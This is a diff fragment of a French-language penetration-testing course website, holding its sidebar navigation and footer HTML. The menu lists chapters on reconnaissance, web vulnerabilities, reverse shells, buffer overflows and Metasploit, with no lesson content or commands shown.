+          <li data-nav-id="/420-513/intro/cybphases/index.html" class=""><a class="padding" href="/420-513/intro/cybphases/index.html">Phases d&#39;une cyberattaque</a></li></ul></li>
+          <li data-nav-id="/420-513/collecte/index.html" class=""><a class="padding" href="/420-513/collecte/index.html">2. Collecte d&#39;informations</a><ul id="R-subsections-836ed22eacc6d10c19942ea0ec7fd7d3" class="morespace collapsible-menu">
+          <li data-nav-id="/420-513/collecte/passive/index.html" class=""><a class="padding" href="/420-513/collecte/passive/index.html">Passive</a></li>
+          <li data-nav-id="/420-513/collecte/active/index.html" class=""><a class="padding" href="/420-513/collecte/active/index.html">Active</a></li></ul></li>
+          <li data-nav-id="/420-513/enumweb/index.html" class=""><a class="padding" href="/420-513/enumweb/index.html">3. Énumération web</a><ul id="R-subsections-35c9976c15304c363c8ea14f2c275c11" class="morespace collapsible-menu">
+          <li data-nav-id="/420-513/enumweb/analyse/index.html" class=""><a class="padding" href="/420-513/enumweb/analyse/index.html">Analyse</a></li>
+          <li data-nav-id="/420-513/enumweb/fuzzing/index.html" class=""><a class="padding" href="/420-513/enumweb/fuzzing/index.html">Fuzzing</a></li></ul></li>
+          <li data-nav-id="/420-513/vuln/index.html" class=""><a class="padding" href="/420-513/vuln/index.html">4. Recherche de vulnérabilités</a><ul id="R-subsections-ba6d3ba55249f05bb81e0514fe91baf6" class="morespace collapsible-menu">
+          <li data-nav-id="/420-513/vuln/types/index.html" class=""><a class="padding" href="/420-513/vuln/types/index.html">Types</a></li>
+          <li data-nav-id="/420-513/vuln/ressources/index.html" class=""><a class="padding" href="/420-513/vuln/ressources/index.html">Ressources</a></li>
+          <li data-nav-id="/420-513/vuln/nessus/index.html" class=""><a class="padding" href="/420-513/vuln/nessus/index.html">Nessus</a></li>
+          <li data-nav-id="/420-513/vuln/outils/index.html" class=""><a class="padding" href="/420-513/vuln/outils/index.html">Autres outils</a></li></ul></li>
+          <li data-nav-id="/420-513/vulnweb/index.html" class=""><a class="padding" href="/420-513/vulnweb/index.html">5. Vulnérabilités Web</a><ul id="R-subsections-5759ab18f34a2b619dfbdce8aa7b2a85" class="morespace collapsible-menu">
+          <li data-nav-id="/420-513/vulnweb/sqlinj/index.html" class=""><a class="padding" href="/420-513/vulnweb/sqlinj/index.html">Injection SQL</a></li>
+          <li data-nav-id="/420-513/vulnweb/xss/index.html" class=""><a class="padding" href="/420-513/vulnweb/xss/index.html">XSS</a></li>
+          <li data-nav-id="/420-513/vulnweb/csrf/index.html" class=""><a class="padding" href="/420-513/vulnweb/csrf/index.html">CSRF</a></li></ul></li>
+          <li data-nav-id="/420-513/exploitation/index.html" class=""><a class="padding" href="/420-513/exploitation/index.html">6. Exploitation</a><ul id="R-subsections-894c9faf54abc7e150203e7252bdf314" class="morespace collapsible-menu">
+          <li data-nav-id="/420-513/exploitation/revshell/index.html" class=""><a class="padding" href="/420-513/exploitation/revshell/index.html">Shells inversés</a></li>
+          <li data-nav-id="/420-513/exploitation/bof/index.html" class=""><a class="padding" href="/420-513/exploitation/bof/index.html">Buffer Overflows</a></li></ul></li>
+          <li data-nav-id="/420-513/automatisation/index.html" class="parent "><a class="padding" href="/420-513/automatisation/index.html">7. Automatisation</a><ul id="R-subsections-0df5a769aeb7922f47e86b93de3a310c" class="morespace collapsible-menu">
+          <li data-nav-id="/420-513/automatisation/metasploit/index.html" class="active"><a class="padding" href="/420-513/automatisation/metasploit/index.html">Metasploit</a></li></ul></li>
+          </ul>
+        </div>
+        <div class="padding footermargin footerLangSwitch footerVariantSwitch footerVisitedLinks footerFooter showFooter"></div>
+        <div id="R-menu-footer">
+          <hr class="padding default-animation footerLangSwitch footerVariantSwitch footerVisitedLinks footerFooter showFooter">
+          <div id="R-prefooter" class="footerLangSwitch footerVariantSwitch footerVisitedLinks">
+            <ul>
+              <li id="R-select-language-container" class="footerLangSwitch">
+                <div class="padding menu-control">
+                  <i class="fa-fw fas fa-language"></i>
+                  <span>&nbsp;</span>
+                  <div class="control-style">
+                    <label class="a11y-only" for="R-select-language">Language</label>
+                    <select id="R-select-language" onchange="location = this.querySelector( this.value ).dataset.url;">
+                      <option id="R-select-language-en" value="#R-select-language-en" data-url="/420-513/automatisation/metasploit/index.html" lang="fr-ca" selected></option>
+                    </select>
+                  </div>
+                  <div class="clear"></div>
+                </div>
+              </li>
+              <li id="R-select-variant-container" class="footerVariantSwitch">
+                <div class="padding menu-control">
+                  <i class="fa-fw fas fa-paint-brush"></i>
+                  <span>&nbsp;</span>
+                  <div class="control-style">
+                    <label class="a11y-only" for="R-select-variant">Theme</label>
+                    <select id="R-select-variant" onchange="window.variants && variants.changeVariant( this.value );">
+                      <option id="R-select-variant-red" value="red" selected>Red</option>
+                    </select>
+                  </div>
+                  <div class="clear"></div>
+                </div>
+                <script>window.variants && variants.markSelectedVariant();</script>
+              </li>
+              <li class="footerVisitedLinks">
+                <div class="padding menu-control">
+                  <i class="fa-fw fas fa-history"></i>
+                  <span>&nbsp;</span>
+                  <div class="control-style">
+                    <button onclick="clearHistory();">Clear History</button>
+                  </div>
+                  <div class="clear"></div>
+                </div>
+              </li>
+            </ul>
+          </div>
+          <div id="R-footer" class="footerFooter showFooter"><a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img alt="Licence Creative Commons"
+        style="border-width:0" src="https://i.creativecommons.org/l/by-nc-sa/4.0/80x15.png" /></a><br>Creative Commons
+BY-NC-SA
+          </div>
+        </div>
+      </div>
+    </aside>
+    <script src="/420-513/js/clipboard.min.js?1731362681" defer></script>
+    <script src="/420-513/js/perfect-scrollbar.min.js?1731362681" defer></script>
+    <script src="/420-513/js/theme.js?1731362681" defer></script>
+  </body>
+</html>
